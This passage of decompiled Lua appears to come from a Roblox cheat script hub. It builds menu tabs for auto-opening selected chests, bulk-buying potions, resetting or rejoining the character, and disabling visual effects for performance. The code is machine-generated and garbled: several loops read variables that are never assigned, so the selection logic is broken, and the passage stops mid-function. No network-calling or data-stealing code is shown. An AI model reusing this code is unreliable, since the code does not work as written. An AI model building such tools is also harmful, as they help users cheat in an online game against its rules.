        local capture_1_287233, capture_1_287234, capture_1_287235, capture_1_287236, capture_1_287237 = tbl_30, tbl_26, tbl_31, tbl_28, tbl_29
        tbl_32.value = function(argument_1)
            local val_265, table_7, ipairs_5, ipairs_6, select_all, ipairs_5_result, select_2, val_266, select_3, val_267, val_268
            local select_all_2 = capture_1_287233.value
            if select_all_2 then
                return
            else
                if argument_1 ~= nil then
                    select_all_2 = argument_1["Select All"]
                else
                    select_all_2 = nil
                end
                if not select_all_2 then
                    select_all_2 = false
                else
                    select_all_2 = true
                end
                val_265 = (capture_1_287234.value)()
                table_7 = table
                if table_7 ~= nil then
                    table_7 = table_7.sort
                else
                    table_7 = nil
                end
                table_7(val_265)
                table_7 = table
                if table_7 ~= nil then
                    table_7 = table_7.insert
                else
                    table_7 = nil
                end
                ipairs_5 = val_265
                ipairs_6 = 1.0
                select_all = "Select All"
                table_7(ipairs_5, ipairs_6, select_all)
                capture_1_287235.value = val_265
                table_7 = capture_1_287236.value
                if select_all_2 ~= table_7 then
                    capture_1_287233.value = true
                    capture_1_287236.value = select_all_2
                    table_7 = capture_1_287236.value
                    if table_7 then
                        capture_1_287237.value = {}
                        table_7 = ipairs
                        ipairs_5 = capture_1_287235.value
                        table_7 = table_7(ipairs_5)
                        while true do
                            select_all = table_7(ipairs_5, ipairs_6)
                            if select_all ~= nil then
                                ipairs_6 = select_all
                                if ipairs_5_result ~= "Select All" then
                                    select_2 = capture_1_287237.value
                                    if argument_1 ~= nil then
                                        val_266 = argument_1[ipairs_5_result]
                                    else
                                        val_266 = nil
                                    end
                                    if not val_266 then
                                        val_266 = false
                                    else
                                        val_266 = true
                                    end
                                    if select_2 then
                                        select_2[ipairs_5_result] = val_266
                                    end
                                    if argument_1 ~= nil then
                                        select_2 = argument_1[ipairs_5_result]
                                    else
                                        select_2 = nil
                                    end
                                    if not select_2 then
                                        select_2 = ChestDropdown
                                        if select_2 then
                                            select_2 = ChestDropdown
                                            val_266 = select_2
                                            if select_2 then
                                                select_2 = select_2.Select
                                            else
                                                select_2 = nil
                                            end
                                            select_3 = ipairs_5_result
                                            select_2(val_266, select_3)
                                        end
                                    end
                                end
                            else
                                break
                            end
                        end
                    else
                        table_7 = ipairs
                        ipairs_5 = capture_1_287235.value
                        table_7 = table_7(ipairs_5)
                        while true do
                            select_all = table_7(ipairs_5, ipairs_6)
                            if select_all ~= nil then
                                ipairs_6 = select_all
                                if ipairs_5_result ~= "Select All" then
                                    select_2 = capture_1_287237.value
                                    if select_2 ~= nil then
                                        select_2 = select_2[ipairs_5_result]
                                    else
                                        select_2 = nil
                                    end
                                    if not select_2 then
                                        select_2 = false
                                    else
                                        select_2 = true
                                    end
                                    if argument_1 ~= nil then
                                        val_266 = argument_1[ipairs_5_result]
                                    else
                                        val_266 = nil
                                    end
                                    if not val_266 then
                                        val_266 = false
                                    else
                                        val_266 = true
                                    end
                                    if val_266 ~= select_2 then
                                        select_3 = ChestDropdown
                                        if select_3 then
                                            select_3 = ChestDropdown
                                            val_267 = select_3
                                            if select_3 then
                                                select_3 = select_3.Select
                                            else
                                                select_3 = nil
                                            end
                                            val_268 = ipairs_5_result
                                            select_3(val_267, val_268)
                                        end
                                    end
                                end
                            else
                                break
                            end
                        end
                    end
                    table_7 = false
                    capture_1_287233.value = table_7
                else
                    table_7 = capture_1_287236.value
                    if table_7 then
                        table_7 = false
                        ipairs_5 = ipairs
                        ipairs_6 = capture_1_287235.value
                        ipairs_5 = ipairs_5(ipairs_6)
                        while true do
                            ipairs_5_result = ipairs_5(ipairs_6, select_all)
                            if ipairs_5_result ~= nil then
                                select_all = ipairs_5_result
                                if select_2 ~= "Select All" then
                                    if argument_1 ~= nil then
                                        val_266 = argument_1[select_2]
                                    else
                                        val_266 = nil
                                    end
                                    if not val_266 then
                                        table_7 = true
                                        break
                                    end
                                end
                            else
                                break
                            end
                        end
                        if table_7 then
                            capture_1_287233.value = true
                            capture_1_287236.value = false
                            ipairs_5 = ChestDropdown
                            if ipairs_5 then
                                ipairs_5 = ChestDropdown
                                ipairs_6 = ipairs_5
                                if ipairs_5 then
                                    ipairs_5 = ipairs_5.Select
                                else
                                    ipairs_5 = nil
                                end
                                select_all = "Select All"
                                ipairs_5(ipairs_6, select_all)
                            end
                            ipairs_5 = false
                            capture_1_287233.value = ipairs_5
                        end
                    else
                        table_7 = true
                        ipairs_5 = false
                        ipairs_6 = ipairs
                        select_all = capture_1_287235.value
                        ipairs_6 = ipairs_6(select_all)
                        while true do
                            select_2 = ipairs_6(select_all, ipairs_5_result)
                            if select_2 ~= nil then
                                ipairs_5_result = select_2
                                if val_266 ~= "Select All" then
                                    ipairs_5 = true
                                    if argument_1 ~= nil then
                                        select_3 = argument_1[val_266]
                                    else
                                        select_3 = nil
                                    end
                                    if not select_3 then
                                        table_7 = false
                                        break
                                    end
                                end
                            else
                                break
                            end
                        end
                        if ipairs_5 then
                            if table_7 then
                                capture_1_287233.value = true
                                capture_1_287236.value = true
                                ipairs_6 = ChestDropdown
                                if ipairs_6 then
                                    ipairs_6 = ChestDropdown
                                    select_all = ipairs_6
                                    if ipairs_6 then
                                        ipairs_6 = ipairs_6.Select
                                    else
                                        ipairs_6 = nil
                                    end
                                    ipairs_5_result = "Select All"
                                    ipairs_6(select_all, ipairs_5_result)
                                end
                                ipairs_6 = false
                                capture_1_287233.value = ipairs_6
                            end
                        end
                    end
                end
                selectedChests = ({})
                table_7 = pairs
                ipairs_5 = argument_1
                table_7 = table_7(ipairs_5)
                while true do
                    select_all = table_7(ipairs_5, ipairs_6)
                    if select_all ~= nil then
                        ipairs_6 = select_all
                        if (ipairs_5_result == true) then
                            if select_all ~= "Select All" then
                                select_2 = selectedChests
                                if select_2 then
                                    select_2[select_all] = true
                                end
                            end
                        end
                    else
                        break
                    end
                end
                return
            end
        end
    end
    do
        local capture_1_288769 = tbl_26
        tbl_33.value = function()
            local val_269 = (capture_1_288769.value)()
            local table_8 = table
            if table_8 ~= nil then
                table_8 = table_8.sort
            else
                table_8 = nil
            end
            table_8(val_269)
            table_8 = table
            if table_8 ~= nil then
                table_8 = table_8.insert
            else
                table_8 = nil
            end
            table_8(val_269, 1.0, "Select All")
            table_8 = ChestDropdown
            local val_270 = table_8
            if table_8 then
                table_8 = table_8.Refresh
            else
                table_8 = nil
            end
            table_8(val_270, val_269, true)
            return
        end
    end
    handler_13 = make_tab_2
    if make_tab_2 then
        tbl_34.value = make_tab_2.AddDropdown
    else
        tbl_34.value = nil
    end
    tbl_35.value = {}
    handler_14 = handler
    tbl_36.value = "Select Chest"
    handler_14 = handler_14(tbl_36.value)
    if tbl_35.value then
        tbl_35.value.Name = handler_14
    end
    handler_14 = handler
    tbl_36.value = "Open chest menu in inventory first"
    handler_14 = handler_14(tbl_36.value)
    if tbl_35.value then
        tbl_35.value.Desc = handler_14
    end
    handler_14 = {}
    if tbl_35.value then
        tbl_35.value.Options = handler_14
    end
    handler_14 = "MultiSelect"
    tbl_36.value = true
    if tbl_35.value then
        tbl_35.value[handler_14] = tbl_36.value
    end
    handler_14 = {}
    if tbl_35.value then
        tbl_35.value.Default = handler_14
    end
    handler_14 = "ChestSelect"
    if tbl_35.value then
        tbl_35.value.Flag = handler_14
    end
    do
        local capture_1_294145 = tbl_32
        handler_14 = function(argument_1)
            (capture_1_294145.value)(argument_1)
            return
        end
    end
    if tbl_35.value then
        tbl_35.value.Callback = handler_14
    end
    tbl_34.value = tbl_34.value(handler_13, tbl_35.value)
    ChestDropdown = tbl_34.value
    tbl_34.value = task
    if tbl_34.value ~= nil then
        tbl_34.value = tbl_34.value.spawn
    else
        tbl_34.value = nil
    end
    do
        local val_271, capture_1_295938, capture_1_295939, val_272, val_273 = info, tbl_33, tbl_27, tbl_7, handler
        handler_13 = function()
            local pack_result_91
            local wait_7, set_3, val_274, pack_result_92, pack_result_93
            while true do
                wait_7 = task.wait
                set_3 = 1.0
                wait_7(set_3)
                wait_7 = val_271()
                if wait_7 then
                    (capture_1_295938.value)()
                    set_3 = capture_1_295939.value
                    set_3()
                else
                    set_3 = val_272
                    val_274 = set_3
                    if set_3 then
                        set_3 = set_3.Set
                    else
                        set_3 = nil
                    end
                    pack_result_91 = pack(val_273("No Chests (Dungeon / Lobby)"))
                    if pack_result_91.n >= 1 then
                        pack_result_92 = pack_result_91[1]
                    end
                    if pack_result_91.n >= 2 then
                        pack_result_93 = pack_result_91[2]
                    end
                    set_3(val_274, unpack(pack_result_91, 1, pack_result_91.n))
                    set_3 = ChestDropdown
                    val_274 = set_3
                    if set_3 then
                        set_3 = set_3.Refresh
                    else
                        set_3 = nil
                    end
                    pack_result_92 = {}
                    pack_result_93 = true
                    set_3(val_274, pack_result_92, pack_result_93)
                end
            end
        end
    end
    tbl_34.value(handler_13)
    tbl_35.value = "AddSlider"
    handler_13 = make_tab_2
    if make_tab_2 then
        tbl_34.value = make_tab_2[tbl_35.value]
    else
        tbl_34.value = nil
    end
    tbl_35.value = {}
    handler_14 = handler
    tbl_36.value = "Chest Amount"
    handler_14 = handler_14(tbl_36.value)
    if tbl_35.value then
        tbl_35.value.Name = handler_14
    end
    handler_14 = "Min"
    tbl_36.value = 1.0
    if tbl_35.value then
        tbl_35.value[handler_14] = tbl_36.value
    end
    handler_14 = "Max"
    tbl_36.value = 250.0
    if tbl_35.value then
        tbl_35.value[handler_14] = tbl_36.value
    end
    if tbl_35.value then
        tbl_35.value.Default = 1.0
    end
    handler_14 = "Increment"
    tbl_36.value = 1.0
    if tbl_35.value then
        tbl_35.value[handler_14] = tbl_36.value
    end
    handler_14 = "ValueName"
    tbl_36.value = "x"
    if tbl_35.value then
        tbl_35.value[handler_14] = tbl_36.value
    end
    handler_14 = "ChestAmount"
    if tbl_35.value then
        tbl_35.value.Flag = handler_14
    end
    do
        local capture_1_303617 = tbl_18
        handler_14 = function(argument_1)
            capture_1_303617.value = argument_1
            return
        end
    end
    if tbl_35.value then
        tbl_35.value.Callback = handler_14
    end
    tbl_34.value(handler_13, tbl_35.value)
    handler_13 = make_tab_2
    if make_tab_2 then
        tbl_34.value = make_tab_2.AddButton
    else
        tbl_34.value = nil
    end
    tbl_35.value = {}
    handler_14 = handler
    tbl_36.value = "Open Chests"
    handler_14 = handler_14(tbl_36.value)
    if tbl_35.value then
        tbl_35.value.Name = handler_14
    end
    handler_14 = handler
    tbl_36.value = "Opens the selected chest x times"
    handler_14 = handler_14(tbl_36.value)
    if tbl_35.value then
        tbl_35.value.Desc = handler_14
    end
    do
        local val_275 = handler_9
        handler_14 = function()
            val_275()
            return
        end
    end
    if tbl_35.value then
        tbl_35.value.Callback = handler_14
    end
    tbl_34.value(handler_13, tbl_35.value)
    handler_13 = make_window
    if make_window then
        tbl_34.value = make_window.MakeTab
    else
        tbl_34.value = nil
    end
    tbl_35.value = {}
    handler_14 = handler
    tbl_36.value = "Shop"
    handler_14 = handler_14(tbl_36.value)
    if tbl_35.value then
        tbl_35.value.Name = handler_14
    end
    if tbl_35.value then
        tbl_35.value.Icon = "rbxassetid://11385419674"
    end
    tbl_34.value = tbl_34.value(handler_13, tbl_35.value)
    tbl_35.value = tbl_34.value
    if tbl_34.value then
        handler_13 = tbl_34.value.AddSection
    else
        handler_13 = nil
    end
    handler_14 = {}
    tbl_36.value = handler
    tbl_36.value = tbl_36.value("Potions")
    handler_14.Name = tbl_36.value
    handler_13(tbl_35.value, handler_14)
    tbl_35.value = tbl_34.value
    if tbl_34.value then
        handler_13 = tbl_34.value.AddDropdown
    else
        handler_13 = nil
    end
    handler_14 = {}
    tbl_36.value = handler
    tbl_36.value = tbl_36.value("Select Potions")
    handler_14.Name = tbl_36.value
    tbl_36.value = {}
    handler_result_2 = "Health Flask (20)"
    handler_result_3 = "Energy Flask (30)"
    connect = "Dragon Flask (60)"
    tbl_36.value[1] = handler_result_2
    tbl_36.value[2] = handler_result_3
    tbl_36.value[3] = connect
    handler_14.Options = tbl_36.value
    tbl_36.value = "MultiSelect"
    if handler_14 then
        handler_14[tbl_36.value] = true
    end
    tbl_36.value = {}
    handler_14.Default = tbl_36.value
    tbl_36.value = "PotionSelect"
    handler_14.Flag = tbl_36.value
    do
        local val_276 = handler_10
        tbl_36.value = function(argument_1)
            val_276(argument_1)
            return
        end
    end
    handler_14.Callback = tbl_36.value
    handler_13(tbl_35.value, handler_14)
    handler_14 = "AddSlider"
    tbl_35.value = tbl_34.value
    if tbl_34.value then
        handler_13 = tbl_34.value[handler_14]
    else
        handler_13 = nil
    end
    handler_14 = {}
    tbl_36.value = handler
    tbl_36.value = tbl_36.value("Potion Amount")
    handler_14.Name = tbl_36.value
    tbl_36.value = "Min"
    if handler_14 then
        handler_14[tbl_36.value] = 1.0
    end
    tbl_36.value = "Max"
    if handler_14 then
        handler_14[tbl_36.value] = 100.0
    end
    tbl_36.value = 1.0
    handler_14.Default = tbl_36.value
    tbl_36.value = "Increment"
    if handler_14 then
        handler_14[tbl_36.value] = 1.0
    end
    tbl_36.value = "ValueName"
    handler_result_2 = handler("Amount")
    if handler_14 then
        handler_14[tbl_36.value] = handler_result_2
    end
    tbl_36.value = "PotionAmount"
    handler_14.Flag = tbl_36.value
    do
        local capture_1_324609 = tbl_19
        tbl_36.value = function(argument_1)
            capture_1_324609.value = argument_1
            return
        end
    end
    handler_14.Callback = tbl_36.value
    handler_13(tbl_35.value, handler_14)
    tbl_35.value = tbl_34.value
    if tbl_34.value then
        handler_13 = tbl_34.value.AddButton
    else
        handler_13 = nil
    end
    handler_14 = {}
    tbl_36.value = handler
    tbl_36.value = tbl_36.value("Buy")
    handler_14.Name = tbl_36.value
    tbl_36.value = handler
    tbl_36.value = tbl_36.value("Buys selected potions with the amount")
    handler_14.Desc = tbl_36.value
    do
        local val_277 = handler_11
        tbl_36.value = function()
            val_277()
            return
        end
    end
    handler_14.Callback = tbl_36.value
    handler_13(tbl_35.value, handler_14)
    tbl_35.value = make_window
    if make_window then
        handler_13 = make_window.MakeTab
    else
        handler_13 = nil
    end
    handler_14 = {}
    tbl_36.value = handler
    tbl_36.value = tbl_36.value("Settings")
    handler_14.Name = tbl_36.value
    tbl_36.value = "rbxassetid://10734950309"
    handler_14.Icon = tbl_36.value
    handler_13 = handler_13(tbl_35.value, handler_14)
    handler_14 = handler_13
    if handler_13 then
        tbl_35.value = handler_13.AddSection
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler("Player")
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    handler_14 = handler_13
    if handler_13 then
        tbl_35.value = handler_13.AddButton
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler("Reset Character")
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    do
        local capture_1_334849 = tbl_11
        handler_result_2 = function()
            local tbl_value_5 = capture_1_334849.value
            if tbl_value_5 then
                tbl_value_5 = capture_1_334849.value
                if tbl_value_5 then
                    tbl_value_5.Health = 0.0
                end
            end
            return
        end
    end
    if tbl_36.value then
        tbl_36.value.Callback = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    handler_14 = handler_13
    if handler_13 then
        tbl_35.value = handler_13.AddButton
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler("Rejoin")
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    do
        local val_278 = handler_result
        handler_result_2 = function()
            local teleport_service = TeleportService
            local val_279 = teleport_service
            if teleport_service then
                teleport_service = teleport_service.Teleport
            else
                teleport_service = nil
            end
            local place_id = game.PlaceId
            teleport_service(val_279, place_id, val_278)
            return
        end
    end
    if tbl_36.value then
        tbl_36.value.Callback = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    handler_14 = handler_13
    if handler_13 then
        tbl_35.value = handler_13.AddButton
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler("Destroy UI")
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    do
        local val_280 = sphub_first_time_path
        handler_result_2 = function()
            local destroy_4 = val_280
            local val_281 = destroy_4
            if destroy_4 then
                destroy_4 = destroy_4.Destroy
            else
                destroy_4 = nil
            end
            destroy_4(val_281)
            return
        end
    end
    if tbl_36.value then
        tbl_36.value.Callback = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    handler_14 = handler_13
    if handler_13 then
        tbl_35.value = handler_13.AddSection
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler
    handler_result_3 = "Performance"
    handler_result_2 = handler_result_2(handler_result_3)
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    tbl_35.value = false
    handler_14 = {}
    tbl_36.value = {}
    handler_14.Lighting = tbl_36.value
    tbl_36.value = {}
    handler_14.Workspace = tbl_36.value
    tbl_36.value = "Instances"
    handler_result_2 = {}
    if handler_14 then
        handler_14[tbl_36.value] = handler_result_2
    end
    tbl_36.value = {}
    do
        local val_282 = handler_14
        handler_result_2 = function()
            local val_283 = val_282
            local tbl_57 = {}
            if val_283 then
                val_283.Instances = tbl_57
            end
            return
        end
    end
    do
        local capture_1_345857 = tbl_36
        handler_result_3 = function()
            local local_1_result_6, local_1_result_7, val_284, protected_call, handler_24
            local ipairs_7 = ipairs
            local val_285 = capture_1_345857.value
            ipairs_7 = ipairs_7(val_285)
            while true do
                local_1_result_7 = ipairs_7(val_285, local_1_result_6)
                if local_1_result_7 ~= nil then
                    local_1_result_6 = local_1_result_7
                    protected_call = pcall
                    local val_286 = val_284
                    handler_24 = function()
                        local disconnect = val_286
                        local val_287 = disconnect
                        if disconnect then
                            disconnect = disconnect.Disconnect
                        else
                            disconnect = nil
                        end
                        disconnect(val_287)
                        return
                    end
                    protected_call(handler_24)
                else
                    break
                end
            end
            capture_1_345857.value = {}
            return
        end
    end
    connect = function(argument_1)
        local is_a_6
        local val_288 = argument_1
        if argument_1 then
            is_a_6 = argument_1.IsA
        else
            is_a_6 = nil
        end
        local post_effect = "PostEffect"
        is_a_6 = is_a_6(val_288, post_effect)
        if not is_a_6 then
            val_288 = argument_1
            if argument_1 then
                is_a_6 = argument_1.IsA
            else
                is_a_6 = nil
            end
            post_effect = "DepthOfFieldEffect"
            is_a_6 = is_a_6(val_288, post_effect)
            if not is_a_6 then
                val_288 = argument_1
                if argument_1 then
                    is_a_6 = argument_1.IsA
                else
                    is_a_6 = nil
                end
                post_effect = "BlurEffect"
                is_a_6 = is_a_6(val_288, post_effect)
                if not is_a_6 then
                    val_288 = argument_1
                    if argument_1 then
                        is_a_6 = argument_1.IsA
                    else
                        is_a_6 = nil
                    end
                    post_effect = "BloomEffect"
                    is_a_6 = is_a_6(val_288, post_effect)
                    if not is_a_6 then
                        val_288 = argument_1
                        if argument_1 then
                            is_a_6 = argument_1.IsA
                        else
                            is_a_6 = nil
                        end
                        post_effect = "SunRaysEffect"
                        is_a_6 = is_a_6(val_288, post_effect)
                        if not is_a_6 then
                            val_288 = argument_1
                            if argument_1 then
                                is_a_6 = argument_1.IsA
                            else
                                is_a_6 = nil
                            end
                            post_effect = "ColorCorrectionEffect"
                            is_a_6 = is_a_6(val_288, post_effect)
                            if not is_a_6 then
                                val_288 = argument_1
                                if argument_1 then
                                    is_a_6 = argument_1.IsA
                                else
                                    is_a_6 = nil
                                end
                                post_effect = "Decal"
                                is_a_6 = is_a_6(val_288, post_effect)
                                if not is_a_6 then
                                    val_288 = argument_1
                                    if argument_1 then
                                        is_a_6 = argument_1.IsA
                                    else
                                        is_a_6 = nil
                                    end
                                    post_effect = "Texture"
                                    is_a_6 = is_a_6(val_288, post_effect)
                                    if not is_a_6 then
                                        val_288 = argument_1
                                        if argument_1 then
                                            is_a_6 = argument_1.IsA
                                        else
                                            is_a_6 = nil
                                        end
                                        post_effect = "ParticleEmitter"
                                        is_a_6 = is_a_6(val_288, post_effect)
                                        if not is_a_6 then
                                            val_288 = argument_1
                                            if argument_1 then
                                                is_a_6 = argument_1.IsA
                                            else
                                                is_a_6 = nil
                                            end
                                            post_effect = "Trail"
                                            is_a_6 = is_a_6(val_288, post_effect)
                                            if not is_a_6 then
                                                val_288 = argument_1
                                                if argument_1 then
                                                    is_a_6 = argument_1.IsA
                                                else
                                                    is_a_6 = nil
                                                end
                                                post_effect = "Beam"
                                                is_a_6 = is_a_6(val_288, post_effect)
                                                if not is_a_6 then
                                                    val_288 = argument_1
                                                    if argument_1 then
                                                        is_a_6 = argument_1.IsA
                                                    else
                                                        is_a_6 = nil
                                                    end
                                                    post_effect = "Fire"
                                                    is_a_6 = is_a_6(val_288, post_effect)
                                                    if not is_a_6 then
                                                        val_288 = argument_1
                                                        if argument_1 then
                                                            is_a_6 = argument_1.IsA
                                                        else
                                                            is_a_6 = nil
                                                        end
                                                        post_effect = "Smoke"
                                                        is_a_6 = is_a_6(val_288, post_effect)
                                                        if not is_a_6 then
                                                            val_288 = argument_1
                                                            if argument_1 then
                                                                is_a_6 = argument_1.IsA
                                                            else
                                                                is_a_6 = nil
                                                            end
                                                            post_effect = "Sparkles"
                                                            is_a_6 = is_a_6(val_288, post_effect)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        return is_a_6
    end
    do
        local val_289 = handler_14
        show_aura = function(argument_1)
            local protected_call_2 = pcall
            local val_290, val_291 = argument_1, val_289
            protected_call_2(function()
                local enabled
                local is_a_7 = val_290
                local val_292 = is_a_7
                if is_a_7 then
                    is_a_7 = is_a_7.IsA
                else
                    is_a_7 = nil
                end
                local post_effect_2 = "PostEffect"
                is_a_7 = is_a_7(val_292, post_effect_2)
                if not is_a_7 then
                    is_a_7 = val_290
                    val_292 = is_a_7
                    if is_a_7 then
                        is_a_7 = is_a_7.IsA
                    else
                        is_a_7 = nil
                    end
                    post_effect_2 = "DepthOfFieldEffect"
                    is_a_7 = is_a_7(val_292, post_effect_2)
                    if not is_a_7 then
                        is_a_7 = val_290
                        val_292 = is_a_7
                        if is_a_7 then
                            is_a_7 = is_a_7.IsA
                        else
                            is_a_7 = nil
                        end
                        post_effect_2 = "BlurEffect"
                        is_a_7 = is_a_7(val_292, post_effect_2)
                        if not is_a_7 then
                            is_a_7 = val_290
                            val_292 = is_a_7
                            if is_a_7 then
                                is_a_7 = is_a_7.IsA
                            else
                                is_a_7 = nil
                            end
                            post_effect_2 = "BloomEffect"
                            is_a_7 = is_a_7(val_292, post_effect_2)
                            if not is_a_7 then
                                is_a_7 = val_290
                                val_292 = is_a_7
                                if is_a_7 then
                                    is_a_7 = is_a_7.IsA
                                else
                                    is_a_7 = nil
                                end
                                post_effect_2 = "SunRaysEffect"
                                is_a_7 = is_a_7(val_292, post_effect_2)
                                if not is_a_7 then
                                    is_a_7 = val_290
                                    val_292 = is_a_7
                                    if is_a_7 then
                                        is_a_7 = is_a_7.IsA
                                    else
                                        is_a_7 = nil
                                    end
                                    post_effect_2 = "ColorCorrectionEffect"
                                    is_a_7 = is_a_7(val_292, post_effect_2)
                                    if is_a_7 then
                                        is_a_7 = val_291
                                        if is_a_7 ~= nil then
                                            is_a_7 = is_a_7.Instances
                                        else
                                            is_a_7 = nil
                                        end
                                        val_292 = val_290
                                        if is_a_7 ~= nil then
                                            is_a_7 = is_a_7[val_292]
                                        else
                                            is_a_7 = nil
                                        end
                                        if (is_a_7 == nil) then
                                            is_a_7 = val_291
                                            if is_a_7 ~= nil then
                                                is_a_7 = is_a_7.Instances
                                            else
                                                is_a_7 = nil
                                            end
                                            val_292 = val_290
                                            post_effect_2 = {
                                                Class = "Effect",
                                            }
                                            enabled = val_290
                                            if enabled ~= nil then
                                                enabled = enabled.Enabled
                                            else
                                                enabled = nil
                                            end
                                            post_effect_2.Enabled = enabled
                                            if is_a_7 then
                                                is_a_7[val_292] = post_effect_2
                                            end
                                        end
                                        is_a_7 = val_290
                                        if is_a_7 then
                                            is_a_7.Enabled = false
                                        end
                                    else
                                        is_a_7 = val_290
                                        val_292 = is_a_7
                                        if is_a_7 then
                                            is_a_7 = is_a_7.IsA
                                        else
                                            is_a_7 = nil
                                        end
                                        post_effect_2 = "Decal"
                                        is_a_7 = is_a_7(val_292, post_effect_2)
                                        if not is_a_7 then
                                            is_a_7 = val_290
                                            val_292 = is_a_7
                                            if is_a_7 then
                                                is_a_7 = is_a_7.IsA
                                            else
                                                is_a_7 = nil
                                            end
                                            post_effect_2 = "Texture"
                                            is_a_7 = is_a_7(val_292, post_effect_2)
                                            if is_a_7 then
                                                is_a_7 = val_291
                                                if is_a_7 ~= nil then
                                                    is_a_7 = is_a_7.Instances
                                                else
                                                    is_a_7 = nil
                                                end
                                                val_292 = val_290
                                                if is_a_7 ~= nil then
                                                    is_a_7 = is_a_7[val_292]
                                                else
                                                    is_a_7 = nil
                                                end
                                                if (is_a_7 == nil) then
                                                    is_a_7 = val_291
                                                    if is_a_7 ~= nil then
                                                        is_a_7 = is_a_7.Instances
                                                    else
                                                        is_a_7 = nil
                                                    end
                                                    val_292 = val_290
                                                    post_effect_2 = {
                                                        Class = "Visual",
                                                    }
                                                    enabled = val_290
                                                    if enabled ~= nil then
                                                        enabled = enabled.Transparency
                                                    else
                                                        enabled = nil
                                                    end
                                                    post_effect_2.Transparency = enabled
                                                    if is_a_7 then
                                                        is_a_7[val_292] = post_effect_2
                                                    end
                                                end
                                                is_a_7 = val_290
                                                if is_a_7 then
                                                    is_a_7.Transparency = 1.0
                                                end
                                            else
                                                is_a_7 = val_290
                                                val_292 = is_a_7
                                                if is_a_7 then
                                                    is_a_7 = is_a_7.IsA
                                                else
                                                    is_a_7 = nil
                                                end
                                                post_effect_2 = "ParticleEmitter"
                                                is_a_7 = is_a_7(val_292, post_effect_2)
                                                if not is_a_7 then
                                                    is_a_7 = val_290
                                                    val_292 = is_a_7
                                                    if is_a_7 then
                                                        is_a_7 = is_a_7.IsA
                                                    else
                                                        is_a_7 = nil
                                                    end
                                                    post_effect_2 = "Trail"
                                                    is_a_7 = is_a_7(val_292, post_effect_2)
                                                    if not is_a_7 then
                                                        is_a_7 = val_290
                                                        val_292 = is_a_7
                                                        if is_a_7 then
                                                            is_a_7 = is_a_7.IsA
                                                        else
                                                            is_a_7 = nil
                                                        end
                                                        post_effect_2 = "Beam"
                                                        is_a_7 = is_a_7(val_292, post_effect_2)
                                                        if not is_a_7 then
                                                            is_a_7 = val_290
                                                            val_292 = is_a_7
                                                            if is_a_7 then
                                                                is_a_7 = is_a_7.IsA
                                                            else
                                                                is_a_7 = nil
                                                            end
                                                            post_effect_2 = "Fire"
                                                            is_a_7 = is_a_7(val_292, post_effect_2)
                                                            if not is_a_7 then
                                                                is_a_7 = val_290
                                                                val_292 = is_a_7
                                                                if is_a_7 then
                                                                    is_a_7 = is_a_7.IsA
                                                                else
                                                                    is_a_7 = nil
                                                                end
                                                                post_effect_2 = "Smoke"
                                                                is_a_7 = is_a_7(val_292, post_effect_2)
                                                                if not is_a_7 then
                                                                    is_a_7 = val_290
                                                                    val_292 = is_a_7
                                                                    if is_a_7 then
                                                                        is_a_7 = is_a_7.IsA
                                                                    else
                                                                        is_a_7 = nil
                                                                    end
                                                                    post_effect_2 = "Sparkles"
                                                                    is_a_7 = is_a_7(val_292, post_effect_2)
                                                                    if is_a_7 then
                                                                        is_a_7 = val_291
                                                                        if is_a_7 ~= nil then
                                                                            is_a_7 = is_a_7.Instances
                                                                        else
                                                                            is_a_7 = nil
                                                                        end
                                                                        val_292 = val_290
                                                                        if is_a_7 ~= nil then
                                                                            is_a_7 = is_a_7[val_292]
                                                                        else
                                                                            is_a_7 = nil
                                                                        end
                                                                        if (is_a_7 == nil) then
                                                                            is_a_7 = val_291
                                                                            if is_a_7 ~= nil then
                                                                                is_a_7 = is_a_7.Instances
                                                                            else
                                                                                is_a_7 = nil
                                                                            end
                                                                            val_292 = val_290
                                                                            post_effect_2 = {
                                                                                Class = "Emitter",
                                                                            }
                                                                            enabled = val_290
                                                                            if enabled ~= nil then
                                                                                enabled = enabled.Enabled
                                                                            else
                                                                                enabled = nil
                                                                            end
                                                                            post_effect_2.Enabled = enabled
                                                                            if is_a_7 then
                                                                                is_a_7[val_292] = post_effect_2
                                                                            end
                                                                        end
                                                                        is_a_7 = val_290
                                                                        if is_a_7 then
                                                                            is_a_7.Enabled = false
                                                                        end
                                                                    end
                                                                else
                                                                    is_a_7 = val_291
                                                                    if is_a_7 ~= nil then
                                                                        is_a_7 = is_a_7.Instances
                                                                    else
                                                                        is_a_7 = nil
                                                                    end
                                                                    val_292 = val_290
                                                                    if is_a_7 ~= nil then
                                                                        is_a_7 = is_a_7[val_292]
                                                                    else
                                                                        is_a_7 = nil
                                                                    end
                                                                    if (is_a_7 == nil) then
                                                                        is_a_7 = val_291
                                                                        if is_a_7 ~= nil then
                                                                            is_a_7 = is_a_7.Instances
                                                                        else
                                                                            is_a_7 = nil
                                                                        end
                                                                        val_292 = val_290
                                                                        post_effect_2 = {
                                                                            Class = "Emitter",
                                                                        }
                                                                        enabled = val_290
                                                                        if enabled ~= nil then
                                                                            enabled = enabled.Enabled
                                                                        else
                                                                            enabled = nil
                                                                        end
                                                                        post_effect_2.Enabled = enabled
                                                                        if is_a_7 then
                                                                            is_a_7[val_292] = post_effect_2
                                                                        end
                                                                    end
                                                                    is_a_7 = val_290
                                                                    if is_a_7 then
                                                                        is_a_7.Enabled = false
                                                                    end
                                                                end
                                                            else
                                                                is_a_7 = val_291
                                                                if is_a_7 ~= nil then
                                                                    is_a_7 = is_a_7.Instances
                                                                else
                                                                    is_a_7 = nil
                                                                end
                                                                val_292 = val_290
                                                                if is_a_7 ~= nil then
